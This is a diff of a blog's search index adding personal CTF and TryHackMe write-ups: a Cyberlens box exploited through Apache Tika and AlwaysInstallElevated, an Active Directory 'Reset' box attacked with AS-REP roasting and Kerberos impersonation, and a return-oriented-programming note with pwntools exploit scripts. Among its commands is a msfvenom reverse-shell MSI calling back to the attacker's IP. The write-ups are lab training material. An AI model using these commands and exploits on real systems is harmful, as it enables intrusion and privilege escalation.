@@ -680,6 +680,37 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Cyberlens on Tryhackme</title>
+    <url>/2024/05/22/cyberlens-thm/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I haven’t posted any pentesting write up recently.<br>It means that I trained my penetration skill hardly recently(but preparing school exams and reversing LOL), time to practice ~<br>Victim’s IP : 10.10.231.218<br>Victim’s Host : cyberlens.thm<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.231.218 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+
+<p>Found out an interesting service on port 61777 (Apache Tika 1.17 Server)  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2018-1335"><a href="#CVE-2018-1335" class="headerlink" title="CVE-2018-1335"></a>CVE-2018-1335</h4><blockquote>
+<p>Exploiting Tika 1.17 server  </p>
+</blockquote>
+<p>After a quick searching on exploit-db, I tried this exploit on msfconsole, and gain a user shell.  </p>
+<p><img src="https://hackmd.io/_uploads/rknxMYoQC.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Exploiting-AlwaysInstallElevated"><a href="#Exploiting-AlwaysInstallElevated" class="headerlink" title="Exploiting AlwaysInstallElevated"></a>Exploiting AlwaysInstallElevated</h4><p>I used PrivescCheck.ps1 script to check PE Vectors on this machine.  </p>
+<p><img src="https://hackmd.io/_uploads/BkUBMti70.png" alt="image">  </p>
+<p>The AlwaysInstallElevated setting allows users to install msi file with admin’s privilege and run it with the same privilege, either.  </p>
+<p>So, just spawn a vicious msi file with msfvenom:  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.195.189  LPORT=9003 -a x64 --platform Windows -f msi -o evil.msi</span><br></pre></td></tr></table></figure>
+<p>Grep it with Victim’s machine and run ~<br><img src="https://hackmd.io/_uploads/SkyCGts70.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkSeXtoXR.png" alt="image">  </p>
+<p>Aha !</p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>My first pentesting on my New Ubuntu VM &gt;w&lt;  </p>
+<p><img src="https://github.com/William957-web/Daily/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-05-22%20223020.png?raw=true" alt="image">  </p>
+<p><strong>References</strong><br><a href="https://juggernaut-sec.com/alwaysinstallelevated/">https://juggernaut-sec.com/alwaysinstallelevated/</a>  </p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>資安入門(?)</title>
     <url>/2023/09/27/cybertea/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因為我也不強，應該也沒資格說怎麼學比較好<br>所以目前不公開，就只給社員們看啦~<br><del>反正不要看我的blog學就好，會瘋掉</del>  </p>
@@ -1585,46 +1616,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Reset on Tryhackme</title>
-    <url>/2024/06/01/reset-thm/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好久沒打ADㄌ，開心&gt;w&lt;<br>而且今天學到超多東西，也釐清了不少觀念  </p>
-<p>Victim’s IP : 10.10.24.60<br>Victim’s Host : thm.corp<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><strong>port scan</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.24.60 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rkz_NiO4R.png" alt="image"><br>很標準的AD環境，有SMB, Kerberos, ldap, RDP …<br>也獲得了域名為<code>thm.corp</code>  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p><strong>crackmapexec</strong><br>由nmap結果知道smb服務可以Anonymous，連進去抓檔案：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.24.60 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/H11wwouV0.png" alt="image">  </p>
-<p>拿到使用者列表，利用 Impacket 庫進行下一步攻擊。<br><strong>GetNPUsers.py</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GetNPUsers.py thm.corp/ -usersfile ~/ctf/tryhackme/reset/userlist.txt -no-pass</span><br></pre></td></tr></table></figure>
-<p>GetNPUsers可以抓到不需要使用前面驗證的使用者TGT，並嘗試本地爆破。<br><strong>john-the-ripper</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john-the-ripper npusers_pass --wordlist=/home/wha13/wordlists/rockyou.txt</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">獲得使用者`TABATHA_BRITT`的密碼</span><br><span class="line">利用smbmap獲取目錄內容：  </span><br><span class="line">```bash</span><br><span class="line">smbmap -u <span class="string">&#x27;TABATHA_BRITT&#x27;</span> -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -H 10.10.24.60</span><br><span class="line">```  </span><br><span class="line">![image](https://hackmd.io/_uploads/SyRXl2d4C.png)  </span><br><span class="line">  </span><br><span class="line">利用 smbclient 登入並抓去 Data 資料夾：  </span><br><span class="line">```bash</span><br><span class="line">smbclient -U THM.CORP\\TABATHA_BRITT \\\\10.10.24.60\\Data</span><br></pre></td></tr></table></figure>
-<p>把抓下來的pdf打開看看發現使用者<code>LILY_ONEILL</code>的密碼<br><img src="https://hackmd.io/_uploads/Hk2Cxn_NR.png" alt="image">  </p>
-<p><del>不過這是rabbit hole</del>  </p>
-<h4 id="Impersonate"><a href="#Impersonate" class="headerlink" title="Impersonate"></a>Impersonate</h4><p>Impersonate是抓到有Delegate權限時，可以對host內任意使用者作暫時的 impersonate 去獲得暫時的token進行登入<br><img src="https://hackmd.io/_uploads/rJucmTuEA.png" alt="image">  </p>
-<p><strong>BloogHound</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;TABATHA_BRITT&#x27;</span> -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -d thm.corp -ns 10.10.24.60 --zip</span><br></pre></td></tr></table></figure>
-<p>抓zip檔案起來分析，從剛剛拿到的使用者TABATHA_BRITT開始<br>發現一連串對下一個使用者的全權限或者更改密碼權限<br><img src="https://hackmd.io/_uploads/Bk_Fn3uE0.png" alt="image">  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;SHAWNA_BRAY&quot;</span> <span class="string">&quot;whale120&quot;</span> -U <span class="string">&quot;thm.corp&quot;</span>/<span class="string">&quot;TABATHA_BRITT&quot;</span>%<span class="string">&quot;marlboro(1985)&quot;</span> -S 10.10.24.60</span><br></pre></td></tr></table></figure>
-<p>像是這樣，最後可以打到user <code>DARLA_WINTERS@THM.CORP</code><br><strong>getST</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./getST.py -spn <span class="string">&quot;cifs/haystack.thm.corp&quot;</span> -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;thm.corp/DARLA_WINTERS:Whale120&quot;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache</span><br></pre></td></tr></table></figure>
-<p><strong>wmiexec</strong><br>透過IPC$連線的腳本，可以支援直接登入&#x2F;NTLM認證等</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ./wmiexec.py -k -no-pass Administrator@haystack.thm.corp</span><br></pre></td></tr></table></figure>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>晚安世界 &gt;w&lt;</p>
-]]></content>
-      <tags>
-        <tag>AD</tag>
-        <tag>Windows</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>BloodHound</tag>
-        <tag>getST</tag>
-        <tag>crackmapexec</tag>
-        <tag>smb</tag>
-        <tag>impersonate</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pwn基礎筆記</title>
     <url>/2023/10/12/pwn-note/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>暑假做的筆記，整理格式一下之後就丟上來啦<br>還有很多要學，繼續努力🐋</p>
@@ -1776,6 +1767,46 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Reset on Tryhackme</title>
+    <url>/2024/06/01/reset-thm/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好久沒打ADㄌ，開心&gt;w&lt;<br>而且今天學到超多東西，也釐清了不少觀念  </p>
+<p>Victim’s IP : 10.10.24.60<br>Victim’s Host : thm.corp<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><strong>port scan</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.24.60 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rkz_NiO4R.png" alt="image"><br>很標準的AD環境，有SMB, Kerberos, ldap, RDP …<br>也獲得了域名為<code>thm.corp</code>  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p><strong>crackmapexec</strong><br>由nmap結果知道smb服務可以Anonymous，連進去抓檔案：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.24.60 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/H11wwouV0.png" alt="image">  </p>
+<p>拿到使用者列表，利用 Impacket 庫進行下一步攻擊。<br><strong>GetNPUsers.py</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GetNPUsers.py thm.corp/ -usersfile ~/ctf/tryhackme/reset/userlist.txt -no-pass</span><br></pre></td></tr></table></figure>
+<p>GetNPUsers可以抓到不需要使用前面驗證的使用者TGT，並嘗試本地爆破。<br><strong>john-the-ripper</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john-the-ripper npusers_pass --wordlist=/home/wha13/wordlists/rockyou.txt</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">獲得使用者`TABATHA_BRITT`的密碼</span><br><span class="line">利用smbmap獲取目錄內容：  </span><br><span class="line">```bash</span><br><span class="line">smbmap -u <span class="string">&#x27;TABATHA_BRITT&#x27;</span> -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -H 10.10.24.60</span><br><span class="line">```  </span><br><span class="line">![image](https://hackmd.io/_uploads/SyRXl2d4C.png)  </span><br><span class="line">  </span><br><span class="line">利用 smbclient 登入並抓去 Data 資料夾：  </span><br><span class="line">```bash</span><br><span class="line">smbclient -U THM.CORP\\TABATHA_BRITT \\\\10.10.24.60\\Data</span><br></pre></td></tr></table></figure>
+<p>把抓下來的pdf打開看看發現使用者<code>LILY_ONEILL</code>的密碼<br><img src="https://hackmd.io/_uploads/Hk2Cxn_NR.png" alt="image">  </p>
+<p><del>不過這是rabbit hole</del>  </p>
+<h4 id="Impersonate"><a href="#Impersonate" class="headerlink" title="Impersonate"></a>Impersonate</h4><p>Impersonate是抓到有Delegate權限時，可以對host內任意使用者作暫時的 impersonate 去獲得暫時的token進行登入<br><img src="https://hackmd.io/_uploads/rJucmTuEA.png" alt="image">  </p>
+<p><strong>BloogHound</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;TABATHA_BRITT&#x27;</span> -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -d thm.corp -ns 10.10.24.60 --zip</span><br></pre></td></tr></table></figure>
+<p>抓zip檔案起來分析，從剛剛拿到的使用者TABATHA_BRITT開始<br>發現一連串對下一個使用者的全權限或者更改密碼權限<br><img src="https://hackmd.io/_uploads/Bk_Fn3uE0.png" alt="image">  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;SHAWNA_BRAY&quot;</span> <span class="string">&quot;whale120&quot;</span> -U <span class="string">&quot;thm.corp&quot;</span>/<span class="string">&quot;TABATHA_BRITT&quot;</span>%<span class="string">&quot;marlboro(1985)&quot;</span> -S 10.10.24.60</span><br></pre></td></tr></table></figure>
+<p>像是這樣，最後可以打到user <code>DARLA_WINTERS@THM.CORP</code><br><strong>getST</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./getST.py -spn <span class="string">&quot;cifs/haystack.thm.corp&quot;</span> -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;thm.corp/DARLA_WINTERS:Whale120&quot;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache</span><br></pre></td></tr></table></figure>
+<p><strong>wmiexec</strong><br>透過IPC$連線的腳本，可以支援直接登入&#x2F;NTLM認證等</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ./wmiexec.py -k -no-pass Administrator@haystack.thm.corp</span><br></pre></td></tr></table></figure>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>晚安世界 &gt;w&lt;</p>
+]]></content>
+      <tags>
+        <tag>AD</tag>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>BloodHound</tag>
+        <tag>getST</tag>
+        <tag>crackmapexec</tag>
+        <tag>smb</tag>
+        <tag>impersonate</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Retro on TryHackMe</title>
     <url>/2024/03/07/retro-thm/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>又是一台HARD<br>打ㄌ兩天才打下來的機器…<br>等等去弄專題owob  </p>
@@ -1802,6 +1833,53 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
         <tag>JuicyPotato</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Return Oriented Program note</title>
+    <url>/2023/10/29/rop1/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I had posted a note of pwn for beginners(<a href="https://wha13.github.io/2023/10/12/pwn-note/">link here</a>), and recently I’ve learned more about ROP, so here is this post~  </p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP?"></a>What is ROP?</h3><p>ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).<br>Basically, a fragment end with <code>ret</code> is mostly used.  </p>
+<h3 id="x86-64-ROP"><a href="#x86-64-ROP" class="headerlink" title="x86_64 ROP"></a>x86_64 ROP</h3><p>In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx ……<br>To connect the ROP Chain, it’s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as <code>ROPgadget</code>  and <code>pwntool</code>.<br><strong>ROPgadget:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary=binary_file | grep &quot;mov dword .* ret&quot; | less</span><br></pre></td></tr></table></figure>
+<p>In this command, I want to find a gadget start with mov_dword and end with ret.<br>but is much more easier to find a register fragment with pwntool.<br><strong>pwntool</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./oob1&#x27;</span>)</span><br><span class="line"><span class="comment"># find an rdi fregment</span></span><br><span class="line">rop.rdi</span><br><span class="line"><span class="comment"># result</span></span><br><span class="line"><span class="comment"># Gadget(0x400a03, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span></span><br></pre></td></tr></table></figure>
+<p>In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
+<p><a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a><br>syscall table has each register need for every call and the meaning for each register.<br>p.s. execve is excution call.<br>Connect fragment like <code>pop rdi; ret</code> with a value can modify the value of <code>rdi</code> and move to mext fregment(possibly a function or syscall)<br>An example for an excution syscall:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, shellcode, pop_rsi_ret, <span class="number">0</span>, syscall)</span><br></pre></td></tr></table></figure>
+<p>This ROP chain would make the value of rax become <code>0x3b</code>(execve on <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>), and rdi value become the address of shellcode(like string: <code>/bin/sh\x00</code>)<br><code>\x00</code> is a symbol to stop reading.<br>Also, vmmap in geb-peda is often used to find writable(or something else) datas.  </p>
+<h3 id="x86-ROP"><a href="#x86-ROP" class="headerlink" title="x86 ROP"></a>x86 ROP</h3><p>Same logic as <code>x86_64</code><br><a href="https://syscalls.w3challs.com/?arch=x86">syscall table</a><br>Some differents between x86 and x86_64:  </p>
+<ol>
+<li>In x86 system, each address and register are mostly 4 bytes  </li>
+<li>int80 in x86 has the same function with syscall in x86_64<br><strong>Example:</strong><br>execve in x86:  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Pwnasm-from-LoTuX-CTF"><a href="#Pwnasm-from-LoTuX-CTF" class="headerlink" title="Pwnasm from LoTuX CTF"></a>Pwnasm from LoTuX CTF</h3><p><a href="https://lotuxctf.com/challenges#Pwnasm-27">Click link</a><br>It’s a simple ROP<br><strong>Solution</strong><br>Start with pwntool:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./pwnasm&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>Extracted datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>It’s a x86_64 system(amd64), so check out the <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a> ,register gadgets needed to trigger <code>syscall</code> are <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>.<br>Also, from the reverse result by <a href="https://ghidra-sre.org/">Ghidra</a><img src="https://hackmd.io/_uploads/ByWE-tiMa.png"><br>there are some weird datas on the stack(our shell(<code>&#39;/bin/sh&#39;</code> at<code>0x00402000</code>) and first part of flag), so it’s possible to construct an ROP Chain and excuse the shell  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.rax</span><br><span class="line">rop.rdi</span><br><span class="line">rop.rsi</span><br><span class="line">rop.rdx</span><br><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
+<p>Extracted datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; rop.rax</span><br><span class="line">Gadget(0x401000, [&#x27;pop rax&#x27;, &#x27;ret&#x27;], [&#x27;rax&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdx</span><br><span class="line">Gadget(0x401006, [&#x27;pop rdx&#x27;, &#x27;ret&#x27;], [&#x27;rdx&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdi</span><br><span class="line">Gadget(0x401002, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rsi</span><br><span class="line">Gadget(0x401004, [&#x27;pop rsi&#x27;, &#x27;ret&#x27;], [&#x27;rsi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.syscall</span><br><span class="line">gadget(address=4198416, details=Gadget(0x401010, [&#x27;syscall&#x27;, &#x27;ret&#x27;], [], 0x4))</span><br></pre></td></tr></table></figure>
+<p>Finally, my exploit code:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;lotuxctf.com&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x402000</span></span><br><span class="line">pop_rax_ret=<span class="number">0x401000</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401002</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401004</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x401006</span></span><br><span class="line">syscall=<span class="number">0x401010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload=flat(pop_rax_ret, <span class="number">0x3b</span>, pop_rdi_ret, shell, pop_rsi_ret, <span class="number">0</span>, pop_rdx_ret, <span class="number">0</span>, syscall)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo server"></a>echo server</h3><p><a href="https://wha13.github.io/files/echo_server/echo_server">file</a><br><a href="https://wha13.github.io/files/echo_server/echo_server.c">source code</a><br>A x86_64 file<br>ROP Chain:<br><code>pop rdi; ret</code>-&gt;<code>change rdi location to global variable</code>-&gt;<code>trigger get function</code>-&gt;<code>return to runCMD function to bypass getString() filtering function</code><br>Exploit:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./echo_server&#x27;</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">runCMD=<span class="number">0x4006c6</span></span><br><span class="line">gets=<span class="number">0x4005a0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400923</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">r.recvlines(<span class="number">7</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload1=padding+flat(pop_rdi_ret, shell, gets, runCMD)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="rop1-sean-Pwn-2"><a href="#rop1-sean-Pwn-2" class="headerlink" title="rop1-sean_Pwn-2"></a>rop1-sean_Pwn-2</h3><p><a href="https://wha13.github.io/files/rop1-sean_Pwn-2/rop1">file</a><br><a href="https://blog.frozenkp.me/pwn/stack_migration/">Stack Migration</a>  </p>
+<h4 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h4><p>Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if it’s a x86_64 system)&#x2F;first 4 bytes(if it’s a x86 system) need to be a location for new register(<del>garbage</del>)</p>
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>First write the ROP Chain into global variable, and trgger it in <code>func1</code>, remember to leave.</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=(<span class="number">0x006c9eb8</span>+<span class="number">0x006cd548</span>)//<span class="number">2</span></span><br><span class="line">pop_rax_rdx_rbx_ret=<span class="number">0x478616</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401516</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401637</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">read=<span class="number">0x43f4b0</span></span><br><span class="line">syscall=<span class="number">0x4003da</span></span><br><span class="line">func1=<span class="number">0x4009ae</span></span><br><span class="line">leave=<span class="number">0x4009e4</span></span><br><span class="line">main=<span class="number">0x4009e6</span></span><br><span class="line">bof2=<span class="number">0x6ccd60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=flat(<span class="number">1004120</span>, pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, bof2+<span class="number">10</span>*<span class="number">0x8</span>, pop_rsi_ret, <span class="number">0</span>, syscall, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;rahwhale&#x27;</span>*<span class="number">4</span>+flat(bof2, leave)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ropfu-from-picoCTF"><a href="#ropfu-from-picoCTF" class="headerlink" title="ropfu from picoCTF"></a>ropfu from picoCTF</h3><p><a href="https://play.picoctf.org/practice/challenge/292?category=6&page=3">link</a><br>An <code>i386</code> (x86) system, key points are on above.<br>Use fragments like <code>mov dword [edx] eax; ret</code> to write shell on eax into location edx.<br>p.s.the shell input need to be converted into hex and reversed<br><strong>exploit</strong></p>
